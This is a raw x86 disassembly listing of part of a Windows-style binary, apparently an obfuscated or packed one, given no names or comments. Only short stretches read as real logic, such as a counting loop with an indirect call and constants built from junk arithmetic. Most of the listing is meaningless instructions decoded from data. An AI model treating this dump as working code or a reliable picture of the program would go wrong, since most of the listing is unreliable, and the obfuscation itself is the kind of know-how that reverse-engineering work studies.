  411378:	cdq    
  411379:	sar    edx,0x8a
  41137c:	inc    esp
  41137d:	add    eax,0xc558ba8
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x210edda1],ecx
  4113db:	test   eax,0x7e7e4001
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x411378
  4113e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e6:	(bad)  
  4113e8:	(bad)  
  4113ea:	mov    al,ds:0x58fe563e
  4113ef:	test   al,0x46
  4113f1:	add    edi,DWORD PTR [edi]
  4113f3:	sub    DWORD PTR [ecx-0x5a5bc84b],0x1434c3df
  4113fd:	push   ss
  4113fe:	pop    edx
  4113ff:	xchg   ecx,eax
  411400:	mov    eax,0xc6426df8
  411405:	cmp    eax,0x6536f337
  41140a:	int3   
  41140b:	out    dx,al
  41140c:	in     al,0xc7
  41140e:	int    0xb2
  411410:	fcomip st,st(2)
  411412:	push   ebx
  411413:	hlt    
  411414:	pop    edi
  411415:	push   0x194fbbb9
  41141a:	mov    bh,0xfe
  41141c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41141d:	pop    esp
  41141e:	ror    BYTE PTR [ebp-0x7342de1],1
  411424:	xchg   ecx,eax
  411425:	scas   al,BYTE PTR es:[edi]
  411426:	cmc    
  411427:	div    DWORD PTR [ebp-0x3b48004b]
  41142d:	cmp    DWORD PTR [edx-0x1e],esi
  411430:	xchg   BYTE PTR [esi+0x71],bh
  411433:	dec    edx
  411434:	push   edi
  411435:	loopne 0x411445
  411437:	push   0x56
  411439:	shr    ebx,0xf
  41143c:	data16 or cl,BYTE PTR [ebx+0x55]
  411440:	pop    ss
  411441:	or     eax,ecx
  411443:	dec    ecx
  411444:	or     DWORD PTR [eax-0x6d6daf78],eax
  41144a:	adc    BYTE PTR [edi],0x4
  41144d:	mul    DWORD PTR [ecx-0x4c]
  411450:	inc    esi
  411451:	loop   0x4114cf
  411453:	jecxz  0x4114b8
  411455:	jg     0x411451
  411457:	sub    DWORD PTR [esi+0x63],eax
  41145a:	ins    BYTE PTR es:[edi],dx
  41145b:	aas    
  41145c:	ret    
  41145d:	adc    eax,0xc7a41d12
  411462:	arpl   WORD PTR [ebp+0x66],bp
  411465:	(bad)  
  411466:	ja     0x4114d2
  411468:	fisttp DWORD PTR [eax-0x52]
  41146b:	dec    edx
  41146c:	add    eax,0x63dad4f0
  411471:	xor    DWORD PTR [ebp+0x4f],ebp
  411474:	push   0xffffff9c
  411476:	inc    ebx
  411477:	and    ebx,DWORD PTR [edi-0x5c61dc26]
  41147d:	shl    DWORD PTR [ecx-0x5b1ce0b5],0x2a
  411484:	les    ebp,FWORD PTR [edi]
  411486:	enter  0x759b,0x29
  41148a:	xor    al,0x64
  41148c:	xor    eax,0x1631670d
  411491:	mov    ah,0x24
  411493:	nop
  411494:	cmc    
  411495:	(bad)  
  411496:	adc    dh,ah
  411498:	xchg   edi,eax
  411499:	dec    edx
  41149a:	dec    ebp
  41149b:	add    dl,BYTE PTR ds:0xcf627b3d
  4114a1:	mov    ch,0x9a
  4114a3:	test   bl,0x37
  4114a6:	push   esi
  4114a7:	mov    ds:0xb947875b,al
  4114ac:	fsubr  st(5),st
  4114ae:	cli    
  4114af:	ror    DWORD PTR [ebx],cl
  4114b1:	leave  
  4114b2:	pop    edx
  4114b3:	inc    eax
  4114b4:	add    bh,ah
  4114b6:	dec    eax
  4114b7:	or     DWORD PTR ds:0x4934ee34,esp
  4114bd:	popa   
  4114be:	push   ds
  4114bf:	jecxz  0x411479
  4114c1:	mov    bh,0x22
  4114c3:	retf   0x88e5
  4114c6:	sub    dl,BYTE PTR [edi-0x80]
  4114c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ca:	or     bl,dl
  4114cc:	je     0x4114eb
  4114ce:	nop
  4114cf:	or     ecx,esi
  4114d1:	inc    esp
  4114d2:	push   esi
  4114d3:	dec    edx
  4114d4:	lods   eax,DWORD PTR ds:[esi]
  4114d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d6:	pop    esi
  4114d7:	aad    0x46
  4114d9:	out    0x12,eax
  4114db:	cmp    DWORD PTR [ebx+0x21],0xc262683d
  4114e2:	test   DWORD PTR [ecx+0xb],edi
  4114e5:	push   esp
  4114e6:	ffreep st(3)
  4114e8:	sbb    esp,DWORD PTR [ebp+0x69]
  4114eb:	fisubr WORD PTR [ecx-0x548adde3]
  4114f1:	push   es
  4114f2:	mov    eax,ds:0xedac94e0
  4114f7:	aas    
  4114f8:	cld    
  4114f9:	into   
  4114fa:	xor    eax,0x9ecd636f
  4114ff:	out    dx,eax
  411500:	xchg   ecx,eax
  411501:	into   
  411502:	retf   0x61a7
  411505:	and    al,0xcf
  411507:	hlt    
  411508:	pop    eax
  411509:	jno    0x411585
  41150b:	imul   eax,DWORD PTR [eax+ecx*8+0x68],0x73
  411510:	cmp    al,0x5a
  411512:	add    eax,0xa6bc249e
  411517:	imul   DWORD PTR [eax+0x79]
  41151a:	fisub  DWORD PTR [eax-0x4]
  41151d:	jmp    0x84b0ca5c
  411522:	fsub   DWORD PTR [eax]
  411524:	jmp    FWORD PTR [eax-0x5e9e4fc4]
  41152a:	mov    esp,0x16fbeb29
  41152f:	dec    dl
  411531:	imul   ebx,ebp,0xc14640a9
  411537:	adc    ebp,ecx
  411539:	add    ebx,DWORD PTR [ebx]
  41153b:	popa   
  41153c:	mov    dl,0x15
  41153e:	bound  edi,QWORD PTR [ecx+esi*1+0x7f]
  411542:	outs   dx,DWORD PTR ds:[esi]
  411543:	into   
  411544:	mov    ch,0x95
  411546:	hlt    
  411547:	or     al,0xe9
  411549:	mov    al,BYTE PTR [ebx]
  41154b:	jne    0x411560
  41154d:	push   eax
  41154e:	push   edi
  41154f:	test   eax,0x3e5f1745
  411554:	pop    edi
  411555:	xchg   edx,eax
  411556:	inc    eax
  411557:	xchg   ebp,ecx
  411559:	rol    BYTE PTR [eax-0x6f],0x23
  41155d:	loope  0x41153a
  41155f:	or     bh,BYTE PTR [eax+0x45ffb5dc]
  411565:	or     al,0xe9
  411567:	pop    edi
  411568:	cld    
  411569:	(bad)  
  41156a:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	xchg   esp,eax
  411582:	iret   
  411583:	fmul   DWORD PTR ds:0x7e7e4180
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115a0
  41158e:	adc    eax,0x8cf4fc35
  411593:	test   al,0x7b
  411595:	inc    esi
  411596:	mov    ah,0xfa
  411598:	push   ebp
  411599:	out    0x98,eax
  41159b:	icebp  
  41159c:	and    bh,BYTE PTR [ebp+0x4a6219de]
  4115a2:	pushf  
  4115a3:	jo     0x4115d7
  4115a5:	frstor [eax+0x7b]
  4115a8:	jbe    0x41154a
  4115aa:	jne    0x41161d
  4115ac:	cmp    ecx,esi
  4115ae:	shl    DWORD PTR [eax-0x67],cl
  4115b1:	xchg   esp,eax
  4115b2:	sbb    eax,0x16d4720f
  4115b7:	or     ebx,DWORD PTR [esi+0x73]
  4115ba:	dec    edx
  4115bb:	sbb    edi,eax
  4115bd:	rcr    DWORD PTR [esi+ecx*2+0x3a],0xec
  4115c2:	cld    
  4115c3:	and    eax,0x50e78ad7
  4115c8:	ret    0xdd47
  4115cb:	and    ah,BYTE PTR [edx]
  4115cd:	pushf  
  4115ce:	scas   al,BYTE PTR es:[edi]
  4115cf:	dec    ebp
  4115d0:	das    
  4115d1:	pop    ss
  4115d2:	xlat   BYTE PTR ds:[ebx]
  4115d3:	in     al,0x4
  4115d5:	push   cs
  4115d6:	ds xchg ebx,eax
  4115d8:	in     al,dx
  4115d9:	and    DWORD PTR [ebp+0xa],edx
  4115dc:	sbb    al,0x63
  4115de:	gs pop ebx
  4115e0:	and    DWORD PTR [ecx-0x2a],esi
  4115e3:	jnp    0x4115a2
  4115e5:	jmp    0x4115d3
  4115e7:	test   al,0x33
  4115e9:	inc    esp
  4115ea:	repnz and cl,BYTE PTR ds:0x5d8f0c05
  4115f1:	push   edi
  4115f2:	mov    edx,0x3e257bfd
  4115f7:	out    dx,al
  4115f8:	popa   
  4115f9:	aam    0x82
  4115fb:	sub    ch,BYTE PTR [edi+0x6b155e1a]
  411601:	push   ebx
  411602:	xchg   ecx,eax
  411603:	popa   
  411604:	scas   eax,DWORD PTR es:[edi]
  411605:	sub    cl,BYTE PTR [ecx+0x7e]
  411608:	and    eax,0x24b9fa99
  41160d:	add    DWORD PTR [edi+0x22],edi
  411610:	add    BYTE PTR [edx+0x5e5c83ea],bh
  411616:	add    eax,0x62ff2576
  41161b:	hlt    
  41161c:	int3   
  41161d:	push   ebp
  41161e:	call   0x5c11fb75
  411623:	loope  0x4116a2
  411625:	or     eax,0x27921dbe
  41162a:	jne    0x4115b1
  41162c:	dec    DWORD PTR [esi+ebp*4]
  41162f:	int3   
  411630:	mov    cs,WORD PTR [esi+0x3dd7eb80]
  411636:	sbb    dl,ch
  411638:	mov    ebp,0x2fc5c300
  41163d:	dec    ebp
  41163e:	stos   DWORD PTR es:[edi],eax
  41163f:	cmp    al,0x9f
  411641:	inc    eax
  411642:	(bad)  
  411643:	inc    edx
  411644:	add    eax,0xe424b0f5
  411649:	test   DWORD PTR [ecx-0x3c],0x7f56087e
  411650:	xor    ch,cl
  411652:	jmp    0x5eabeb76
  411657:	dec    esp
  411658:	fnstsw WORD PTR [edx-0x1]
  41165b:	les    ecx,FWORD PTR [ebx-0x13]
  41165e:	mov    ecx,0xedfba35f
  411663:	push   esp
  411664:	xchg   esp,eax
  411665:	scas   al,BYTE PTR es:[edi]
  411666:	inc    edx
  411667:	and    al,0x6e
  411669:	repz adc ebx,esp
  41166c:	jns    0x41163d
  41166e:	sbb    eax,DWORD PTR [eax]
  411670:	jmp    0xc9b9:0xe7035816
  411677:	jmp    0x411660
  411679:	rcl    cl,0x73
  41167c:	stos   BYTE PTR es:[edi],al
  41167d:	addr16 or eax,0x7bf63797
  411683:	js     0x4116c2
  411685:	push   0xffffffca
  411687:	ins    BYTE PTR es:[edi],dx
  411688:	push   ss
  411689:	js     0x411653
  41168b:	pusha  
  41168c:	cmp    cl,bh
  41168e:	mov    edx,0x4d1da2a8
  411693:	in     eax,0xd0
  411695:	push   edx
  411696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411697:	test   BYTE PTR [edi+0x32],0xf9
  41169b:	cmp    ch,BYTE PTR [esi]
  41169d:	hlt    
  41169e:	mov    cl,0xa
  4116a0:	pushf  
  4116a1:	xchg   ebp,eax
  4116a2:	mov    edx,fs
  4116a4:	hlt    
  4116a5:	out    0x78,eax
  4116a7:	cmp    ch,al
  4116a9:	mov    edi,0xd6ae58bd
  4116ae:	(bad)  
  4116af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b0:	pop    esp
  4116b1:	imul   ecx,DWORD PTR [edx],0xb684a323
  4116b7:	pusha  
  4116b8:	int3   
  4116b9:	ror    cl,0xa7
  4116bc:	push   ecx
  4116bd:	jmp    0x5216915f
  4116c2:	push   ebx
  4116c3:	outs   dx,DWORD PTR ds:[esi]
  4116c4:	jmp    0xc0b0:0xe2ee0cd1
  4116cb:	and    eax,0xc4e69aea
  4116d0:	or     cl,BYTE PTR [ebp+0x2e]
  4116d3:	push   ebp
  4116d4:	sub    BYTE PTR [edx-0x5ff3eea8],al
  4116da:	jmp    DWORD PTR [eax]
  4116dc:	add    eax,0x9eecdc99
  4116e1:	call   0x8197:0xa40eb26b
  4116e8:	test   eax,0xfe29e9ab
  4116ed:	aaa    
  4116ee:	jae    0x4116b0
  4116f0:	push   0xb
  4116f2:	and    eax,0x758c6b88
  4116f7:	dec    esp
  4116f8:	mov    ?,WORD PTR [esp+ebx*8-0x57215969]
  4116ff:	aas    
  411700:	xlat   BYTE PTR ds:[ebx]
  411701:	lea    ebx,[esi+eiz*2]
  411704:	push   edi
  411705:	sbb    BYTE PTR [ebx+0x451f2346],0x44
  41170c:	mov    ecx,DWORD PTR [ebp+0x10]
  41170f:	add    eax,esi
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x343e5f54
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411753
  41178e:	sub    bl,BYTE PTR [eax-0x2bc5c3d7]
  411794:	popf   
  411795:	hlt    
  411796:	(bad)  
  411798:	cwde   
  411799:	pop    eax
  41179a:	jmp    0x68cf63e8
  41179f:	add    bl,ch
  4117a1:	xor    al,0x46
  4117a3:	aas    
  4117a4:	jb     0x4117c3
  4117a6:	aaa    
  4117a7:	mov    ds:0xebd24987,al
  4117ac:	(bad)  
  4117ad:	fs jae 0x411826
  4117b0:	or     al,0xdc
  4117b2:	adc    eax,0x61afa6d4
  4117b7:	xchg   edx,eax
  4117b8:	jmp    0x41177f
  4117ba:	mov    bl,0x34
  4117bc:	into   
  4117bd:	jno    0x411820
  4117bf:	or     BYTE PTR [eax-0x4eb80177],dh
  4117c5:	sbb    al,0x8b
  4117c7:	xchg   edx,edi
  4117c9:	xchg   esp,eax
  4117ca:	jmp    0x4117a3
  4117cc:	push   ss
  4117cd:	sti    
  4117ce:	(bad)  
  4117cf:	aad    0x0
  4117d1:	retf   
  4117d2:	pushf  
  4117d3:	cmp    al,dh
  4117d5:	sub    ch,bh
  4117d7:	push   eax
  4117d8:	test   al,0x84
  4117da:	int3   
  4117db:	mov    dl,0x41
  4117dd:	adc    BYTE PTR [edx-0x1b7d494a],bh
  4117e3:	rcl    DWORD PTR [eax],0x83
  4117e6:	rol    BYTE PTR [esi],0x7c
  4117e9:	sti    
  4117ea:	fld    DWORD PTR ss:[esi-0x58a2adee]
  4117f1:	sub    al,0x1f
  4117f3:	cmp    ah,0x54
  4117f6:	enter  0x187c,0x5e
  4117fa:	aam    0x37
  4117fc:	ror    DWORD PTR [di-0x5b93],0x1
  411802:	xor    eax,DWORD PTR [ecx+0x652ce0f8]
  411808:	cmp    DWORD PTR [eax+0x28c8e315],ebp
  41180e:	aam    0xe4
  411810:	add    edi,esp
  411812:	sar    BYTE PTR [ebp-0x7893e8c0],cl
  411818:	xchg   ebx,eax
  411819:	fist   DWORD PTR [ecx-0x3d]
  41181c:	ins    BYTE PTR es:[edi],dx
  41181d:	mov    eax,0x7ca69b84
  411822:	sub    al,0xa6
  411824:	inc    ebx
  411825:	test   DWORD PTR [esi-0x58],0x41eb7146
  41182c:	cld    
  41182d:	dec    edx
  41182e:	outs   dx,BYTE PTR ds:[esi]
  41182f:	leave  
  411830:	cmp    esi,DWORD PTR [ecx-0x35941886]
  411836:	mov    ch,0x38
  411838:	xor    al,BYTE PTR [edx-0xf944b44]
  41183e:	inc    edx
  41183f:	(bad)  
  411840:	ds jecxz 0x4117e6
  411843:	aaa    
  411844:	push   esi
  411845:	add    BYTE PTR [esi+0x2c],bl
  411848:	lea    eax,[ebx+ebx*4+0x5631e27c]
  41184f:	inc    ecx
  411850:	cwde   
  411851:	inc    edi
  411852:	pusha  
  411853:	adc    cl,dh
  411855:	aaa    
  411856:	sub    DWORD PTR [edx],0xffffff96
  411859:	in     eax,0x54
  41185b:	data16 jnp 0x411860
  41185e:	call   0xf04a:0x6b5e2415
  411865:	es pusha 
  411867:	lahf   
  411868:	xor    al,0x82
  41186a:	loopne 0x4118af
  41186c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41186e:	sti    
  41186f:	lods   al,BYTE PTR ds:[esi]
  411870:	xor    edi,edx
  411872:	sub    al,0xe7
  411874:	sbb    eax,0x9d2e1491
  411879:	inc    esp
  41187a:	cmp    eax,0x41c4546a
  41187f:	bound  esp,QWORD PTR [esi+0x7c4e68c9]
  411885:	mov    bh,0xd5
  411887:	mov    ebx,0x30d33c3e
  41188c:	ret    0x28a
  41188f:	inc    ebx
  411890:	and    BYTE PTR [eax+0x5818d3f2],dh
  411896:	mov    es,WORD PTR [edx]
  411898:	aas    
  411899:	and    BYTE PTR ds:0x36185706,cl
  41189f:	add    eax,0x669eb176
  4118a4:	jmp    DWORD PTR [edi+0x269e2672]
  4118aa:	fsubr  QWORD PTR [edi]
  4118ac:	(bad)  
  4118ad:	cmp    al,0xaa
  4118af:	ins    DWORD PTR es:[edi],dx
  4118b0:	bndstx [ecx+0x4f41761f],(bad)
  4118b7:	pusha  
  4118b8:	sbb    al,0x69
  4118ba:	(bad)  
  4118bb:	jmp    0xa922:0x180c83d6
  4118c2:	(bad)  
  4118c3:	icebp  
  4118c4:	nop
  4118c5:	ss inc ebx
  4118c7:	call   FWORD PTR [edi]
  4118c9:	shl    DWORD PTR [ebx],cl
  4118cb:	je     0x4118d4
  4118cd:	mov    ds:0x5f026615,eax
  4118d2:	fistp  QWORD PTR [ecx+0x35]
  4118d5:	stos   BYTE PTR es:[edi],al
  4118d6:	stos   BYTE PTR es:[edi],al
  4118d7:	mov    eax,0xc6cc56ac
  4118dc:	lods   al,BYTE PTR ds:[esi]
  4118dd:	lahf   
  4118de:	int3   
  4118df:	push   eax
  4118e0:	cmp    BYTE PTR [edi-0x238d65f9],cl
  4118e6:	ins    BYTE PTR es:[edi],dx
  4118e7:	dec    esp
  4118e8:	jns    0x41187d
  4118ea:	jo     0x411933
  4118ec:	retf   0x12c4
  4118ef:	pop    es
  4118f0:	imul   ebp,ecx,0xdef2efa3
  4118f6:	cmp    edi,esi
  4118f8:	sub    ah,dh
  4118fa:	jno    0x4118a1
  4118fc:	cli    
  4118fd:	aad    0xb4
  4118ff:	dec    DWORD PTR [edx+0x597007e2]
  411905:	shl    BYTE PTR [ecx+0x4f],1
  411908:	lods   eax,DWORD PTR ds:[esi]
  411909:	lahf   
  41190a:	cmp    esp,DWORD PTR [edi+0x3d3cf1b0]
  411910:	push   0xc7ecdba2
  411915:	or     al,0x1c
  411917:	aaa    
  411918:	outs   dx,BYTE PTR ds:[esi]
  411919:	fs sahf 
  41191b:	cwde   
  41191c:	fs jl  0x4118e1
  41191f:	ins    BYTE PTR es:[edi],dx
  411920:	aam    0xfc
  411922:	cmp    eax,0x861b53a5
  411927:	test   DWORD PTR [edi+0x6],esp
  41192a:	lods   al,BYTE PTR ds:[esi]
  41192b:	ss pop ecx
  41192d:	push   esi
  41192e:	mov    bh,0x15
  411930:	cmp    al,0x10
  411932:	loope  0x411921
  411934:	repnz or bl,BYTE PTR [esi+edi*2]
  411938:	jno    0x4119a9
  41193a:	jmp    0x411972
  41193c:	aaa    
  41193d:	aas    
  41193e:	in     eax,0x87
  411940:	shl    BYTE PTR ds:0xd5f6b1e6,0x4f
  411947:	cmp    DWORD PTR [esi+0x69],edi
  41194a:	mov    esp,0x85a87abd
  41194f:	lea    esi,[ebx+0x46]
  411952:	shl    DWORD PTR [esi],0x1
  411955:	sub    edx,DWORD PTR [edi]
  411957:	les    esp,FWORD PTR [esi]
  411959:	push   edx
  41195a:	or     dl,BYTE PTR [ebp+eax*1-0xb]
  41195e:	add    dh,al
  411960:	mov    ds:0x14a254e,eax
  411965:	shl    DWORD PTR [esp+eax*4],cl
  411968:	mov    al,0xa7
  41196a:	fdiv   QWORD PTR [ebx]
  41196c:	shr    edi,0x4b
  41196f:	not    ch
  411971:	add    ch,al
  411973:	lods   al,BYTE PTR ds:[esi]
  411974:	jnp    0x411984
  411976:	int3   
  411977:	div    DWORD PTR [ebp+0x13]
  41197a:	adc    BYTE PTR [edx],0x12
  41197d:	mov    dh,0xab
  41197f:	cs jne 0x4119e4
  411982:	(bad)  
  411984:	je     0x4119bc
  411986:	mov    al,BYTE PTR [ebp-0x22a4bcec]
  41198c:	idiv   BYTE PTR [edi-0x20]
  41198f:	adc    BYTE PTR [eax-0x6c84a43d],0x55
  411996:	out    0xee,al
  411998:	mov    eax,0x3dd9935a
  41199d:	push   ecx
  41199e:	pop    edi
  41199f:	(bad)  
  4119a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a1:	scas   eax,DWORD PTR es:[edi]
  4119a2:	pop    ecx
  4119a3:	add    eax,0x9922e43c
  4119a8:	cmp    BYTE PTR [ebp+esi*2+0x3],0x48
  4119ad:	cmp    al,0x9
  4119af:	sbb    eax,0x433723
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0xc2
  411a13:	(bad)  
  411a14:	pop    ebx
  411a15:	add    ah,BYTE PTR ds:0x107e7e4d
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x4119d4
  411a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a20:	mov    WORD PTR [ebp+0x7c],?
  411a23:	pop    es
  411a24:	xchg   esi,eax
  411a25:	(bad)  
  411a26:	stc    
  411a27:	jmp    0x57:0x7f3ee9b7
  411a2e:	in     al,dx
  411a2f:	icebp  
  411a30:	push   ecx
  411a31:	jp     0x411a32
  411a33:	push   ebx
  411a34:	xchg   esi,eax
  411a35:	pop    eax
  411a36:	add    al,0xd0
  411a38:	jmp    0x4119e7
  411a3a:	dec    esi
  411a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a3c:	sahf   
  411a3d:	xchg   ebp,eax
  411a3e:	jo     0x411a1b
  411a40:	jmp    0x321c:0x4ddd38b0
  411a47:	add    eax,0x894b06d0
  411a4c:	int    0x4e
  411a4e:	fstp   TBYTE PTR [edi+0x4281c28f]
  411a54:	pause  
  411a56:	ins    DWORD PTR es:[edi],dx
  411a57:	and    DWORD PTR [ecx-0xf],eax
  411a5a:	push   es
  411a5b:	jp     0x411a9d
  411a5d:	test   al,0x21
  411a5f:	jge    0x4119f9
  411a61:	or     al,0x8c
  411a63:	xchg   ebx,eax
  411a64:	cmp    DWORD PTR [eax],0x702d4d4d
  411a6a:	adc    DWORD PTR [edx],ecx
  411a6c:	push   DWORD PTR [ebx]
  411a6e:	das    
  411a6f:	aam    0x5b
  411a71:	ins    DWORD PTR es:[edi],dx
  411a72:	mov    esp,0xcd5e8ca7
  411a77:	js     0x411aec
  411a79:	ins    DWORD PTR es:[edi],dx
  411a7a:	and    eax,0x23698916
  411a7f:	adc    esi,esp
  411a81:	repz mov cl,0x40
  411a84:	(bad)  
  411a85:	call   0xcbfd4551
  411a8a:	ret    
  411a8b:	repz sbb ebx,DWORD PTR ds:0x54e76471
  411a92:	clc    
  411a93:	jmp    0x411b0f
  411a95:	add    edx,DWORD PTR [ebx]
  411a97:	and    edi,DWORD PTR [edi+eax*4]
  411a9a:	mov    ch,0x30
  411a9c:	jbe    0x411a55
  411a9e:	call   0x1c17:0x70281f06
  411aa5:	dec    edx
  411aa6:	dec    esp
  411aa7:	sub    al,BYTE PTR gs:[eax+0x52]
  411aab:	cs popa 
  411aad:	(bad)  [edi-0x3d]
  411ab0:	and    DWORD PTR es:[edx+ebp*4+0x7f],esp
  411ab5:	xchg   ecx,eax
  411ab6:	data16 scas al,BYTE PTR es:[edi]
  411ab8:	test   eax,0xb90187b3
  411abd:	cld    
  411abe:	sub    esi,DWORD PTR [edi]
  411ac0:	pusha  
  411ac1:	and    edi,edi
  411ac3:	mov    ebx,0xdbcb5231
  411ac8:	stos   BYTE PTR es:[edi],al
  411ac9:	aaa    
  411aca:	and    BYTE PTR [ebx],dl
  411acc:	sbb    dl,dl
  411ace:	bound  esi,QWORD PTR [esp+ebp*8-0x75]
  411ad2:	mov    bl,0x70
  411ad4:	clc    
  411ad5:	or     al,0x1a
  411ad7:	inc    BYTE PTR [edx]
  411ad9:	mov    ah,0xd1
  411adb:	mov    ecx,0xbeee9728
  411ae0:	or     cl,BYTE PTR [ebp+0x39]
  411ae3:	vmaxsd xmm4,xmm2,xmm7
  411ae7:	sub    cl,BYTE PTR [edx-0x2d]
  411aea:	push   0xf
  411aec:	cmp    ch,bl
  411aee:	add    al,0x5d
  411af0:	sbb    bh,BYTE PTR [esp+esi*2-0x345863eb]
  411af7:	lds    eax,FWORD PTR [ebx+0x55dd2a2d]
  411afd:	mov    edi,0x9ca00e77
  411b02:	inc    edi
  411b03:	and    BYTE PTR [edx+0x649ace31],ah
  411b09:	ror    ah,0xbf
  411b0c:	aam    0x38
  411b0e:	mov    edi,0x72ff37ca
  411b13:	out    dx,al
  411b14:	pop    ebp
  411b15:	js     0x411b47
  411b17:	cmp    dl,BYTE PTR [ebp+0x6b]
  411b1a:	xchg   edi,eax
  411b1b:	shl    BYTE PTR [edx+0x55d3ef9f],cl
  411b21:	stos   DWORD PTR es:[edi],eax
  411b22:	loopne 0x411aa4
  411b24:	mov    ecx,0x1e5946af
  411b29:	es pop esp
  411b2b:	xchg   ecx,eax
  411b2c:	inc    edx
  411b2d:	ret    
  411b2e:	mov    al,0x7f
  411b30:	jo     0x411af3
  411b32:	pop    ecx
  411b33:	ss sub al,0xf9
  411b36:	add    DWORD PTR [ecx],edi
  411b38:	dec    ecx
  411b39:	mov    WORD PTR [ebx-0x6b],es
  411b3c:	jmp    0x8c17ba5d
  411b41:	dec    ebx
  411b42:	ret    
  411b43:	push   cs
  411b44:	add    al,0x5c
  411b46:	repnz inc esi
  411b48:	jge    0x411acd
  411b4a:	cwde   
  411b4b:	push   0xb
  411b4d:	pop    es
  411b4e:	ret    
  411b4f:	or     bh,BYTE PTR [ebp-0x40b1eeec]
  411b55:	mov    ch,0x15
  411b57:	add    BYTE PTR ds:0x4cea9be5,0xdc
  411b5e:	jns    0x411b4d
  411b60:	repnz hlt 
  411b62:	(bad)  
  411b63:	mov    ah,0xd2
  411b65:	retf   
  411b66:	dec    eax
  411b67:	adc    ecx,0xbf3713d9
  411b6d:	icebp  
  411b6e:	xor    BYTE PTR [esi+0x48e81df3],dl
  411b74:	xchg   BYTE PTR [ecx],bl
  411b76:	out    0x9,al
  411b78:	cli    
  411b79:	leave  
  411b7a:	adc    bl,BYTE PTR ds:0x659094d3
  411b80:	jne    0x411b5c
  411b82:	call   0x8534363c
  411b87:	xchg   ecx,eax
  411b88:	push   edx
  411b89:	je     0x411be3
  411b8b:	retf   
  411b8c:	adc    eax,0x26869449
  411b91:	push   edx
  411b92:	mov    edx,0x4248927e
  411b97:	jp     0x411ba2
  411b99:	mov    dh,0xf1
  411b9b:	into   
  411b9c:	or     esi,DWORD PTR [esi+0x7d53fb61]
  411ba2:	fisttp DWORD PTR [ebx]
  411ba4:	test   DWORD PTR [ebp+0x7a],0x2bdcd811
  411bab:	ins    BYTE PTR es:[edi],dx
  411bac:	cmp    ch,dl
  411bae:	iret   
  411baf:	cmp    al,0x36
  411bb1:	and    BYTE PTR [eax+0x7346b751],dl
